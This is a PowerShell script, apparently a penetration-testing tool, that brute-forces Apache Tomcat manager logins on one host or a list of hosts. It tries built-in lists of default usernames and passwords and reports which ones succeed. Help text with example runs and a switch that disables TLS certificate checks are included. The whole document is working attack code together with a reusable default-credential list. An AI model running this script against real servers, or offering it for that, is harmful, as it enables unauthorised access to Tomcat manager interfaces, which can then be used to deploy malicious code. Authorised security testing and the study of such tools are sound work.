<#
 	.SYNOPSIS
	   This script attempts to login with default Tomcat Username and credentials using
       a brute force attack. Tomcat by default ships with very easy to guess manager interface
       passwords, and the manager interface is rarely turned off.

	Function: Invoke-TomcatLogin
	Author: Matt Kelly
	Required Dependencies: PSv3

	.PARAMETER File

	Specify a file with hosts:ports to test against, example: C:\Temp\hosts.txt.

	.PARAMETER Computer

	Specify a single tomcat web server to test against in the form, IP:PORT, example: 192.168.1..
	
	.PARAMETER UserName

	Supply the username if testing custom, otherwise defaults to custom list.

    .PARAMETER Password

	Supply the username if testing custom, otherwise defaults to custom list.

	.PARAMETER URIPath

	Supply the URI to test, defaults to /manager/html/.

    .PARAMETER IgnoreSSL

	Ignore bad SSL certificates switch -IgnoreSSL.
		
	.EXAMPLE

	Execute on a single host using the default builtin database:
	Invoke-TomcatLogin -Computer 192.168.1.10:8080

    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,
    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,
    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,password
    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,password
    [+]Success on host http://192.168.1.10:8080 with Username: admin and Password tomcat
    etc...

	
	.EXAMPLE

	Brute force Tomcat manager login on a single host ignoring SSL:
	Invoke-TomcatLogin -Computer 192.168.1.10:8443 -IgnoreSSL
	  
	.EXAMPLE

	Brute force Tomcat manager login on a list of hosts ignoring SSLL:
	Invoke-TomcatLogin -File C:\Temp\Hosts.txt -IgnoreSSL
	
#>
[CmdletBinding(DefaultParameterSetName="AnonymousEnumeration")]
Param(
		[Parameter(Mandatory=$false,
		HelpMessage='Provide a list of computers and ports in format IP:PORT, example: C:\Temp\hosts.txt')]
		[ValidateScript({Test-Path $_})]
		[string]$File,
		
		[Parameter(Mandatory=$false,
		HelpMessage='Provide a Computer to test for, attempts to ping to validate connection')]
        #[ValidateScript({Test-Connection -quiet -count 1 -ComputerName $_})]
		[string]$Computer = $null,
		
		[Parameter(Mandatory=$false,
		HelpMessage='Optionally provide the domain and username if performing authenticated enumeration, example: domain\user1')]
		[string]$UserName,
		
		[Parameter(Mandatory=$false,
		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
		[string]$Password,

	    [Parameter(ParameterSetName = "IgnoreSSL")]
		[switch]$IgnoreSSL,

        [Parameter(Mandatory=$false,
		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
		[string]$URIPath = "/manager/html"
	)
Function Invoke-TomcatLogin
{
#Build arrays of default usernames and passwords, passwords based of many lists including Metasploit and custom
if(!$UserName)
{
    #big = [array]$UserName = "admin","tomcat","administrator","manager","j2deployer","ovwebusr","cxsdk","root","xampp","ADMIN","testuser"
    [array]$UserName = "admin","tomcat","administrator","manager","j2deployer"
}
if (!$Password)
{
    #big = [array]$Password = "","admin","password","tomcat","manager","j2deployer","OvW*busr1","kdsxc","owaspbwa","ADMIN","xampp","s3cret","Password1","testuser","redi_123"
    [array]$Password = "","admin","password","tomcat","manager","j2deployer"
}
#Ignore SSL From http://connect.microsoft.com/PowerShell/feedback/details/419466/new-webserviceproxy-needs-force-parameter-to-ignore-ssl-errors thanks @Mattifestation and HaIR
if ($IgnoreSSL)
{
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy


}
$Success = @()
if (!$Computer)
{
    
    if ($File)
    {
        [array]$Computer = Get-Content $File
    }
    else
    {
        Write-Host "You must select either a Computer or File"
        exit
    }
}
    foreach ($User in $UserName)
    {
        foreach ($Pass in $Password)
            {
                $auth = $User + ':' + $Pass
                $Encoded = [System.Text.Encoding]::UTF8.GetBytes($auth)
                $EncodedPassword = [System.Convert]::ToBase64String($Encoded)
                $headers = @{"Authorization"="Basic $($EncodedPassword)"}
                foreach ($Computertarget in $Computer)
                {
                    if ($Computertarget -Match "443")
                    {
                        $URIHTTP = "https://"
                    }
                    else
                    {
                        $URIHTTP = "http://"
                    }
                    $URIString = $URIHTTP + $Computertarget + $URIPath
                    try
                    {
                        $Page = Invoke-RestMethod -Uri $URIString -Header $headers -Method Get
                        Write-Host "[+]Success on host $URIString with Username: $User and Password $Pass"
                            $SuccessLogin = [ordered]@{
                            URI = $URIString
                            UserName = $User
                            Password = $Pass
                        }
                        $SuccessLoginObj = [pscustomobject]$SuccessLogin
                        $Success += $SuccessLoginObj

                    
                    }
                    catch
                    {
                        Write-Host "[-]Bad username and password on $URIString with: $User,$Pass"
                    }
                }
         
      }
    
}
if($Success)
{
    Write-Host ""
    Write-Host "Successfull Login:"
    $Success
}
}
